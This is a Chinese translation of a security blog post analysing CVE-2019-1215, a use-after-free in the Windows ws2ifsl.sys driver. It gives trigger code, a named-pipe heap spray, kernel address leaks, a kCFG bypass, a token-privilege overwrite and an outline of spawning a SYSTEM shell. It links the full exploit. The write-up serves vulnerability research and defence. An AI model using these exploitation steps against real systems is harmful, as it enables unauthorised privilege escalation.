# CVE-2019-1215：Windows内核ws2ifsl.sys中UAF漏洞分析

阅读量 **1238415**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-01-09 16:00:17

 **x**

##### 译文声明

本文是翻译文章，文章原作者 bluefrostsecurity，文章来源：labs.bluefrostsecurity.de

原文地址：<https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0155e408cb06f06f7f.jpg)

## 简介

这篇文章主要介绍ws2ifsl.sys中最近修补的UAF漏洞（CVE-2019-1215），这个漏洞可用于本地特权提升。该漏洞存在于Windows
7、Windows 8、Windows 10、Windows 2008、Windows 2012和Windows
2019中，已于2019年9月10日进行了修补。

这篇文章描述了Windows 10 19H1 (1903) x64上的具体原因分析和利用。这个exploit演示了如何绕过kASLR、kCFG和SMEP。

## 关于ws2ifsl

为了更好的理解这个分析，我们必须介绍一些关于这个驱动程序的背景信息。没有关于这个驱动程序的公开文档，以下大部分信息都是逆向的。ws2ifsl组件是一个与winsocket相关的驱动程序。

驱动程序实现两个对象：

  * 一个进程对象
  * 一个socket对象

这个驱动实现了几个派遣函数，当调用NtCreateFile时，文件名设置为`\Device\WS2IFSL\`，将调用DispatchCreate函数，函数将根据文件名中的`_FILE_FULL_EA_INFORMATION.EaName`字符串进行判断，如果是NifsPvd，它将调用CreateProcessFile，如果是NifsSct，它将调用CreateSocketFile。

CreateSocketFile和CreateProcessFile函数都创建内部对象，称为“procData”和“socketData”。创建后，这些对象将保存在文件对象的`_FILE_OBJECT.FsContext`中，这个文件对象是在dispatch
routine中创建的。

文件对象可以在用户模式中访问从NtCreateFile返回的句柄对象。该句柄可用于执行DeviceIoControl或调用WriteFile。也就是说“procData”和“sockedData”对象没有直接引用`ObfReferenceObject`和`ObfDereferenceObject`，而是引用了底层的文件对象。

驱动程序实现了两个APC对象，分别称为’request queue’和’cancel
queue’。APC机制是在另一个线程中异步执行函数。因为可以在另一个线程中强制执行多个apc，所以内核实现了一个队列，其中存储所有要执行的apc。

“procData”对象包含这两个APC对象，由CreateProcessFile在initializerqueue和InitializeCancelQueue中初始化。一个APC对象由`KeInitializeApc`初始化，并接收一个目标线程和一个函数作为参数。此外，还设置了处理器模式（内核或用户模式）以及RundownRoutine。如果是ws2ifsl，则RundownRoutine为
RequestRundownRoutine和
CancelRundownRoutine，则处理器模式设置为用户模式。这些RundownRoutine用于清理，如果线程有机会在APC内部执行之前死亡，则由内核调用。之所以会发生这种情况，是因为仅当APC设置为alertable状态时，才进入线程内执行它。例如，如果调用SleepEx时第二个参数设置为TRUE，则可以将线程设置为alertable状态。

驱动程序还在DispatchReadWrite中实现了一个读写dispatch
routine，只能socket对象可访问，并调用DoSocketReadWrite。这个函数通过调用SignalRequest函数使用`nt!KeInsertQueueApc`函数将APC元素添加到APC队列中。

###  与驱动通信

在许多情况下，驱动程序会创建符号链接，并且其名称可用作CreateFileA的文件名
，但是ws2ifsl不是这样。它只能在`nt!IoCreateDevice`的DeviceName设置为
‘DeviceWS2IFSL’的情况下进行调用。但是，通过调用本地API
NtOpenFile，就可以访问派遣函数ws2ifsl!DispatchCreate。以下代码可完成此操作：

    
    
    HANDLE fileHandle = 0;
    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, (PWSTR)L"\Device\WS2IFSL");
    OBJECT_ATTRIBUTES object;
    InitializeObjectAttributes(&object, &deviceName, 0, NULL, NULL);
    IO_STATUS_BLOCK IoStatusBlock ;
    NtOpenFile(&fileHandle, GENERIC_READ, &object, &IoStatusBlock, 0, 0);
    

DispatchCreate函数将检查打开调用的扩展属性。此属性只能通过NtCreateFile系统调用设置。

对于process对象，扩展属性(ea)数据缓冲区必须包含一个属于当前进程的线程句柄，然后我们就有一个设备句柄，可以使用它来做进一步的操作。

## 补丁分析

介绍了背景知识，我们可以进行补丁分析。补丁分析首先对比ws2ifsl未修补版本(10.0.18362.1)和修补版本(10.0.18362.356)。

可以看到修补的函数：

  * CreateProcessFile
  * DispatchClose
  * SignalCancel
  * SignalRequest
  * RequestRundownRoutine
  * CancelRundownRoutine

在以下截图中可以看到：

![](https://p0.ssl.qhimg.com/t01262c948d46940aee.png)

修补后的版本还包含一个新功能:

  * DereferenceProcessContext

最明显的变化是，所有改变的函数都包含对新函数DereferenceProcessContext的调用，如下图所示:

![](https://p2.ssl.qhimg.com/t01d8d8c457f14ff432.png)

接下来要注意的是’procData’对象扩展了一个新成员，现在使用引用计数。例如，在负责所有初始化的CreateProcessFile中，这个新成员被设置为1。

    
    
    procData->tag = 'corP';
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    procData->field_100 = 0;
    

vs

    
    
    procData->tag = 'corP';
    *(_QWORD *)&procData->processId = PsGetCurrentProcessId();
    procData->dword100 = 0;
    procData->referenceCounter = 1i64; // new
    

DereferenceProcessContex函数检查引用计数，并调用nt!ExFreePoolWithTag返回。

DispatchClose函数也打补丁了，新版本将调用从nt!ExFreePoolWithTag改变到DereferenceProcessContext,这表示，有时（如果引用计数不是零）“procData”不会被释放，只会将其引用计数递减一。

SignalRequest中的修复会在调用`nt!KeInsertQueueApc`之前增加referenceCounter。

BUG在于DispatchClose函数可以释放“procData”对象，即使请求一个已在队列中的APC。每当关闭文件句柄的最后一个引用时(通过调用CloseHandle)，就会调用DispatchClose函数。

补丁通过使用新的referenceCounter来确保缓冲区只有在最后一个引用被删除之后才会被释放。如果是RundownRoutine（包含引用），则在函数末尾删除
DereferenceProcessContext引用。并在调用`nt!KeInsertQueueApc`之前增加引用计数。如果发生错误（可能nt!KeInsertQueueApc会失败），该引用也会被删除（避免内存泄漏）。

###  触发bug

要触发这个bug，只需创建一个“procData”句柄和一个“socketData”句柄，向“socketData”写入一些数据并关闭两个句柄。

线程终止调用APC RundownRoutine，将处理释放的数据。以下代码将触发该BUG：

    
    
    <..>
    in CreateProcessHandle:
    
        g_hThread1 = CreateThread(0, 0, ThreadMain1, 0, 0, 0);
        eaData->a1 = (void*)g_hThread1; // thread must be in current process
        eaData->a2 = (void*)0x2222222;  // fake APC Routine
        eaData->a3 = (void*)0x3333333;  // fake cancel Rundown Routine
        eaData->a4 = (void*)0x4444444;
        eaData->a5 = (void*)0x5555555;
    
        NTSTATUS status = NtCreateFile(&fileHandle, MAXIMUM_ALLOWED, &object, &IoStatusBlock, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OPEN_IF, 0, eaBuffer, sizeof(FILE_FULL_EA_INFORMATION) + sizeof("NifsPvd") + sizeof(PROC_DATA));
        DWORD supSuc = SuspendThread(g_hThread1);
    <..>
    in main:
    
    HANDLE procHandle = CreateProcessHandle();
    HANDLE sockHandle = CreateSocketHandle(procHandle);
    
    char* writeBuffer = (char*) malloc(0x100);
    
    IO_STATUS_BLOCK io;
    LARGE_INTEGER byteOffset;
    byteOffset.HighPart = 0;
    byteOffset.LowPart = 0;
    byteOffset.QuadPart = 0;
    byteOffset.u.LowPart = 0;
    byteOffset.u.HighPart = 0;
    ULONG key = 0; 
    
    CloseHandle(procHandle);
    
    NTSTATUS ret = NtWriteFile(sockHandle, 0, 0, 0, &io, writeBuffer, 0x100, &byteOffset, &key);
    

可以在DispatchClose释放处下一个断点来验证：

    
    
    Breakpoint 2 hit
    ws2ifsl!DispatchClose+0x7d:
    fffff806`1b8e71cd e8ceeef3fb      call    nt!ExFreePool (fffff806`178260a0)
    1: kd> db rcx
    ffffae0d`ceafbc70  50 72 6f 63 00 00 00 00-8c 07 00 00 00 00 00 00  Proc............
    1: kd> g
    Breakpoint 0 hit
    ws2ifsl!RequestRundownRoutine:
    fffff806`1b8e12d0 48895c2408      mov     qword ptr [rsp+8],rbx
    0: kd> db rcx-30
    ffffae0d`ceafbc70  50 72 6f 63 00 00 00 00-8c 07 00 00 00 00 00 00  Proc............
    

因为`procData`对象已经被释放，所以RundownRoutine将处理释放的数据。在大多数情况下，这不会崩溃，因为数据块没有重新分配。

## Heap Spray

在知道如何触发bug之后，我们接下来就可以利用漏洞。第一步是回收释放的分配。

首先，我们需要知道缓冲区和分配池的大小。

在要释放的缓冲区上使用pool命令，我们可以看到它分配在Nonpaged pool上，大小为0x120字节。

    
    
    1: kd> !pool ffff8b08905e9910
    Pool page ffff8b08905e9910 region is Nonpaged pool
    <..>
    *ffff8b08905e9900 size:  120 previous size:    0  (Allocated) *Ws2P Process: ffff8b08a32e3080
            Owning component : Unknown (update pooltag.txt)
    

可以通过查看ws2ifsl!CreateProcessFile中分配的缓冲区来验证：

    
    
    PAGE:00000001C00079ED mov     edx, 108h       ; size
    PAGE:00000001C00079F2 mov     ecx, 200h       ; PoolType
    PAGE:00000001C00079F7 mov     r8d, 'P2sW'     ; Tag
    PAGE:00000001C00079FD call    cs:__imp_ExAllocatePoolWithQuotaTag
    

在Nonpaged pool上执行任意大小的可控分配的可靠方法是使用命名管道：Alex Ionescu 在介绍了[此技术](http://alex-ionescu.com/?p=231)。以下代码可用于为多个0x120字节的缓冲区分配用户控制的数据：

    
    
    int doHeapSpray()
    {
        for (size_t i = 0; i < 0x5000; i++)
        {
            HANDLE readPipe;
            HANDLE writePipe;
            DWORD resultLength;
            UCHAR payload[0x120 - 0x48];
            RtlFillMemory(payload, 0x120 - 0x48, 0x24);
    
            BOOL res = CreatePipe(&readPipe, &writePipe, NULL, sizeof(payload));
    
            res = WriteFile(writePipe, payload, sizeof(payload), &resultLength, NULL);
        }  
        return 0;
    }
    

如果我们将这个堆喷射合并到触发bug的代码中，我们将在`nt!KiInsertQueueApc`中触发一个bug检查。崩溃是由于对“liked
list”操作的安全冲突造成的。

    
    
    .text:00000001400A58F6 mov     rax, [rdx]
    .text:00000001400A58F9 cmp     [rax+_LIST_ENTRY.Blink], rdx
    .text:00000001400A58FD jnz     fail_fast
    <..>
    .text:00000001401DC2EA fail_fast:                              ; CODE XREF: KiInsertQueueApc+53↑j
    .text:00000001401DC2EA                                         ; KiInsertQueueApc+95↑j ...
    .text:00000001401DC2EA                 mov     ecx, 3
    .text:00000001401DC2EF                 int     29h             ; Win8: RtlFailFast(ecx)
    

错误检查刚好在int 29指令处进行。在崩溃检查寄存器时，我们可以看到RAX寄存器指向我们可控的数据。

    
    
    rax=ffff8b08905e82d0 rbx=0000000000000000 rcx=0000000000000003
    rdx=ffff8b08a39c3128 rsi=0000000000000000 rdi=0000000000000000
    rip=fffff8057489a2ef rsp=ffffde8268bfd4c8 rbp=ffffde8268bfd599
     r8=ffff8b08a39c3118  r9=fffff80574d87490 r10=fffff80574d87490
    r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
    r14=0000000000000000 r15=0000000000000000
    
    0: kd> dq ffff8b08905e82d0
    ffff8b08`905e82d0  24242424`24242424 24242424`24242424
    ffff8b08`905e82e0  24242424`24242424 24242424`24242424
    ffff8b08`905e82f0  24242424`24242424 24242424`24242424
    ffff8b08`905e8300  24242424`24242424 24242424`24242424
    ffff8b08`905e8310  24242424`24242424 24242424`24242424
    ffff8b08`905e8320  24242424`24242424 24242424`24242424
    ffff8b08`905e8330  24242424`24242424 24242424`24242424
    ffff8b08`905e8340  24242424`24242424 24242424`24242424
    

导致崩溃的调用堆栈如下：

    
    
    0: kd> k
     # Child-SP          RetAddr           Call Site
    00 ffffb780`3ac7e868 fffff804`334a90c2 nt!DbgBreakPointWithStatus
    01 ffffb780`3ac7e870 fffff804`334a87b2 nt!KiBugCheckDebugBreak+0x12
    02 ffffb780`3ac7e8d0 fffff804`333c0dc7 nt!KeBugCheck2+0x952
    03 ffffb780`3ac7efd0 fffff804`333d2ae9 nt!KeBugCheckEx+0x107
    04 ffffb780`3ac7f010 fffff804`333d2f10 nt!KiBugCheckDispatch+0x69
    05 ffffb780`3ac7f150 fffff804`333d12a5 nt!KiFastFailDispatch+0xd0
    06 ffffb780`3ac7f330 fffff804`333dd2ef nt!KiRaiseSecurityCheckFailure+0x325
    07 ffffb780`3ac7f4c8 fffff804`332cb84f nt!KiInsertQueueApc+0x136a87
    08 ffffb780`3ac7f4d0 fffff804`3323ec58 nt!KiSchedulerApc+0x22f
    09 ffffb780`3ac7f600 fffff804`333c5002 nt!KiDeliverApc+0x2e8
    0a ffffb780`3ac7f6c0 fffff804`33804258 nt!KiApcInterrupt+0x2f2
    0b ffffb780`3ac7f850 fffff804`333c867a nt!PspUserThreadStartup+0x48
    0c ffffb780`3ac7f940 fffff804`333c85e0 nt!KiStartUserThread+0x2a
    0d ffffb780`3ac7fa80 00007ff8`ed3ace50 nt!KiStartUserThreadReturn
    0e 0000009e`93bffda8 00000000`00000000 ntdll!RtlUserThreadStart
    

因为主线程结束而触发了错误检查。之所以会发生这种情况，是因为我们破坏的APC仍然在队列中，并且断开连接的操作可以处理损坏的数据。因为前后指针已损坏并且没有指向有效的链接列表，因此会造成safe
unlinking检查。

###  KeRundownApcQueues

使用释放的APC元素的代码需要更改，将其转换为有用的内容。

在触发错误并重写旧的“PRODATA”之后，需要退出APC队列的线程。如果这样做了，内核将调用`nt!KeRundownApcQueues`函数检查`nt!KiFlushQueueApc`!因为它访问损坏的数据。

然而，这一次我们可以控制缓冲区的内容，我们可以避免安全异常，因为链表的有效指针是用一个指向“kthread”内部的值来检查的。假如我们以中等完整性级别（Integrity
Level）运行，那么使用S`ystemHandleInformation`调用`NtQuerySystemInformation`可能会泄漏“kthread”的地址。如果我们使用“kthread”地址来创建回收的“procData”，并且`nt!KeRundownApcQueues`尝试在“procData”对象中执行用户控制的函数指针，就可以避免错误检查。

###  绕过kCFG

在我们控制了想要执行的函数指针之后，还有一个需要克服的小障碍。KASLR不是这个exploit的问题，因为可能会泄漏ntoskrnl基地址。在中等完整性级别下，可以通过NtQuerySystemInformation
/ SystemModuleInformation泄漏所有加载模块的基地址。因此，我们现在至少知道可以将执行转移到何处。

但是，APC函数指针调用由Microsoft实现的CFI内核控制流保护。如果我们调用随机ROP gadget,内核会抛出一个错误检查。

幸运的是，从CFG的角度来看，函数序言都是有效的分支目标，因此我们知道可以调用什么而不必停止。在调用`nt!KeRundownApcQueues`函数指针时，第一个参数（rcx）指向“procData”缓冲区，第二个参数（rdx）为零。

我们可以使用的另一种可能性是通过调用本地函数NtTestAlert来调用APC函数指针。  
当使用NtTestAlert调用APC函数指针时，第一个参数(rcx)指向“procData”缓冲区，第二个参数(rdx)也指向它。

在寻找一些小函数，根据给定的约束执行操作之后，我们找到了一个合适的对象：`nt!SeSetAccessStateGenericMapping`。

如下所示，`nt!SeSetAccessStateGenericMapping`可用于执行16字节的任意写入。

![](https://p0.ssl.qhimg.com/t015a3cabc5246f07ff.png)

不幸的是，这16个字节的后半部分未被完全控制，但是前8个字节是基于堆喷射所提供的数据。

###  token覆盖

一旦我们有了一个强大的任意写原语(Primitives)，我们可以做很多事情。在旧的Windows版本中，有很多技术可以将一个任意的写操作转换成一个完整的内核读写原语。在Windows
10的最新版本中，这些技术已得到缓解。一种仍在起作用的技术是token覆盖（token overwrite）技术。它最初于2012年在Cesar
Cerrudo的“[Easy local Windows Kernel
Exploitation](http://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf)”中发布，思路是破坏`_TOKEN`对象内部的`_SEP_TOKEN_PRIVILEGES`对象。最简单的方法是在启用所有位的情况下覆盖此结构的Present和Enabled成员。这将让我们获得SeDebugPrivilege特权，允许我们将代码注入到高特权进程中，如’winlogon.exe’。

###  获取系统特权

一旦我们注入到系统进程中，这基本上就结束了。现在，我们可以运行“cmd.exe”，为我们提供了一个交互式的shell。我们还避免了`kCFG`和`SMEP`的许多问题，因为我们不执行ROP或在错误的上下文中执行任何ring0代码。

## Exploit

Exploit最终目标是Windows 10 19H1
x64，可以在这里找到[https://github.com/bluefrostsecurity/CVE-2019-1215。使用中等完整性权限执行exploit](https://github.com/bluefrostsecurity/CVE-2019-1215%E3%80%82%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E6%9D%83%E9%99%90%E6%89%A7%E8%A1%8Cexploit)
时，成功利用该漏洞后将生成一个具有系统权限的cmd.exe。

本文翻译自BFSLABS

本文翻译自labs.bluefrostsecurity.de
[原文链接](https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **qwert** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/196893](/post/id/196893)

安全客 - 有思想的安全新媒体

本文转载自:
[labs.bluefrostsecurity.de](https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/)

如若转载,请注明出处：
<https://labs.bluefrostsecurity.de/blog/2020/01/07/cve-2019-1215-analysis-of-a-use-after-free-in-ws2ifsl/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [UAF](/tag/UAF)

 **+1** __3赞

 __收藏

![](https://p2.ssl.qhimg.com/t01de37baca165a5b78.png) qwert

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

